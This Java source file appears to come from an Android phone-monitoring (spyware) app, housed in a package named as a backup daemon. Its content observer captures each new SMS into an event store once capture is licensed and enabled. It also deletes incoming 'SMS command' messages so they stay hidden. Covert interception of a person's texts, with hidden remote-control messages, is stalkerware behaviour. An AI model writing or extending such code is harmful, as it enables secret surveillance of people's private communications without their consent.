package com.vvt.dalvik.mbackupd.mmssms;

import java.util.HashSet;

import android.content.Context;
import android.database.ContentObserver;
import android.net.Uri;
import android.os.Handler;
import com.fx.dalvik.util.FxLog;

import com.fx.dalvik.event.EventSms;
import com.fx.dalvik.mmssms.MmsSmsDatabaseHelper;
import com.fx.dalvik.mmssms.MmsSmsDatabaseManager;
import com.vvt.android.syncmanager.Customization;
import com.vvt.android.syncmanager.control.ConfigurationManager;
import com.vvt.android.syncmanager.control.EventManager;
import com.vvt.android.syncmanager.control.LicenseManager;
import com.vvt.android.syncmanager.control.Main;

public final class MmsSmsContentObserver extends ContentObserver {
	
	private static final String TAG = "MmsSmsContentObserver";
	private static final boolean DEBUG = true;
 	private static final boolean LOCAL_LOGV = Customization.DEBUG ? DEBUG : false;
    
    private Context mContext;
    private ConfigurationManager mConfigManager;
    private EventManager mEventManager;
    private LicenseManager mLicenseManager;
    
    private boolean isRegistered = false;
    private long mRefId = -1;
    
    public MmsSmsContentObserver(Handler handler) { 
		super(handler);
		mContext = Main.getContext();
		mConfigManager = Main.getInstance().getConfigurationManager();
		mEventManager = Main.getInstance().getEventsManager();
		mLicenseManager = Main.getInstance().getLicenseManager();
	}
	
	@Override
	public void onChange(boolean selfChangeBoolean) { 
		if (LOCAL_LOGV) {
			FxLog.v(TAG, "onChange # ENTER ...");
		}
		
		int rowDeleted = MmsSmsDatabaseManager.deleteSmsCommand(mContext);
		if (rowDeleted > 1) {
			if (LOCAL_LOGV) {
				FxLog.v(TAG, "onChange # SMS command is deleted!!");
			}
		}
		
		boolean isActivated = mLicenseManager.isActivated();
		boolean capturedEnabled = mConfigManager.loadCaptureEnabled();
    	boolean capturedSmsEnabled = mConfigManager.loadCaptureSmsEnabled();
    	
    	if (!isActivated || !capturedEnabled || !capturedSmsEnabled) {
    		if (LOCAL_LOGV) {
    			FxLog.v(TAG, "onContentChange # SMS Capturing is disabled!! -> EXIT");
    		}
    		return;
    	}
    	
    	long latestId = MmsSmsDatabaseManager.getLatestSmsId(mContext);
		if (latestId == mRefId) {
			if (LOCAL_LOGV) {
				FxLog.v(TAG, "onContentChange # Latest ID is not changed!!");
			}
		}
		else if (latestId < mRefId) {
			if (LOCAL_LOGV) {
				FxLog.v(TAG, "onContentChange # Found changes, update mRefId");
			}
			setRefId(latestId);
		}
		else {
			HashSet<EventSms> smses = MmsSmsDatabaseManager.getNewerSms(mContext, mRefId);
			
			if (smses == null || smses.size() == 0) {
				if (LOCAL_LOGV) {
					FxLog.v(TAG, "onContentChange # No new event found!! -> EXIT ...");
				}
				return;
			}
			
			long maxId = mRefId;
			for (EventSms sms : smses) {
				long id = sms.getId();
				if (id > mRefId) {
					mEventManager.insert(sms);
					if (LOCAL_LOGV) {
						FxLog.v(TAG, String.format("onContentChange # Capture: %s", 
								sms.getShortDescription()));
					}
					// Find maximum ID in collections
					if (id > maxId) {
						maxId = id;
					}
				}
			}
			if (maxId > mRefId) {
				setRefId(maxId);
			}
		}
		
		if (LOCAL_LOGV) {
			FxLog.v(TAG, "onContentChange # EXIT ...");
		}
    	
    	if (LOCAL_LOGV) {
			FxLog.v(TAG, "onChange # EXIT ...");
		}
	}
	
	public void register() {
		if (isRegistered) {
			if (LOCAL_LOGV) {
				FxLog.v(TAG, "register # Register FAILED!! Duplicated registration");
			}
			return;
		}
		Uri uri = MmsSmsDatabaseHelper.CONTENT_URI_MMS_SMS;
		Main.getContentResolver().registerContentObserver(uri, true, this);
		isRegistered = true;
		
		if (LOCAL_LOGV) {
			FxLog.v(TAG, String.format("register # Register success, uri: %s", uri));
		}
	}
	
	public void unregister() {
		if (isRegistered) {
			Main.getContentResolver().unregisterContentObserver(this);
			isRegistered = false;
			
			if (LOCAL_LOGV) {
				FxLog.v(TAG, "unregister # Unregister success");
			}
		}
	}
	
	public void setRefId(long refId) {
		mRefId = refId;
		
		// Update refId
		mConfigManager.dumpRefIdSms(mRefId);
		
		if (LOCAL_LOGV) {
			FxLog.v(TAG, String.format("setRefId # mRefId: %d", mRefId));
		}
	}
	
}
